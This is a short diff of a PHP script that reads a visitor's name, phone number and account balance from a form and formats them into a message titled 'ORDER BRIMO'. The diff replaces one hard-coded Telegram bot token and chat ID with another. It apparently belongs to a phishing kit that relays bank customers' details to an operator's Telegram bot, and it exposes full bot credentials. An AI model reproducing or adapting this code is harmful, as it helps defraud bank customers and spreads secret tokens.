@@ -3,8 +3,8 @@ $nama  = $_POST['nama'] ?? '';
 $nomor = $_POST['nomor'] ?? '';
 $saldo = $_POST['saldo'] ?? '';
 
-$botToken = '7633884429:AAGzLoN3NukJqC_nkMviol9X81aKMjHRZDA';
-$chatId   = '7680148723';
+$botToken = '7360488690:AAGomohSvdkHu7w6acoa3ftTXnoFgHmtk6U';
+$chatId   = '7866753726';
 
 $message = "𝗢𝗥𝗗𝗘𝗥 𝗕𝗥𝗜𝗠𝗢 || $nama\n\n"
          . "Nama: $nama\n"
